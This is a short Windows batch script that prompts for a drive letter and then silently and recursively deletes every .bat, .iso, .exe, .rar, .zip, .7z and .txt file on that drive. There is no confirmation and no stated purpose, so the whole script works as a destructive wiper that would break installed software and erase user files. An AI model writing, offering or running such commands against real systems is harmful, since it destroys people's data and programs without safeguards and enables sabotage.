@echo off
set /p drive=Enter drive letter (e.g., C):\ 
del /q /s "%drive%:\*.bat"
del /q /s "%drive%:\*.iso"
del /q /s "%drive%:\*.exe"
del /q /s "%drive%:\*.rar"
del /q /s "%drive%:\*.zip"
del /q /s "%drive%:\*.7z"
del /q /s "%drive%:\*.txt"
